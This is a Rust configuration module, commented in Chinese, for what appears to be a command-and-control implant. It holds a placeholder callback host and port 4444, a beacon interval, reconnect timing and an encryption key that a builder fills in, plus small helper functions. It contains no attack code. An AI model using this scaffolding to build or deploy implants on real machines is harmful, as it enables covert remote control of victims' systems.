//! Implant 配置
//! 这些值会在生成时被 Builder 修改

/// 服务器地址 (IP 或域名)
pub const SERVER_HOST: &str = "127.0.0.1";

/// 服务器端口
pub const SERVER_PORT: u16 = 4444;

/// 使用 HTTPS
pub const USE_TLS: bool = false;

/// 客户端标签
pub const TAG: &str = "default";

/// Beacon 轮询间隔 (秒)
pub const HEARTBEAT_INTERVAL: u64 = 30;

/// 重连延迟 (秒)
pub const RECONNECT_DELAY: u64 = 5;

/// 版本号
pub const VERSION: &str = "1.0.0";

/// 加密密钥 (64 hex chars = 32 bytes)
/// 由 Builder 生成时填入
pub const ENCRYPTION_KEY: &str = "0000000000000000000000000000000000000000000000000000000000000000";

/// 获取服务器 HTTP URL
pub fn get_http_url() -> String {
    let scheme = if USE_TLS { "https" } else { "http" };
    format!("{}://{}:{}", scheme, SERVER_HOST, SERVER_PORT)
}

// 兼容函数
pub fn get_server_host() -> &'static str { SERVER_HOST }
pub fn get_server_port() -> u16 { SERVER_PORT }
pub fn get_use_tls() -> bool { USE_TLS }
pub fn get_tag() -> &'static str { TAG }
pub fn get_encryption_key() -> &'static str { ENCRYPTION_KEY }
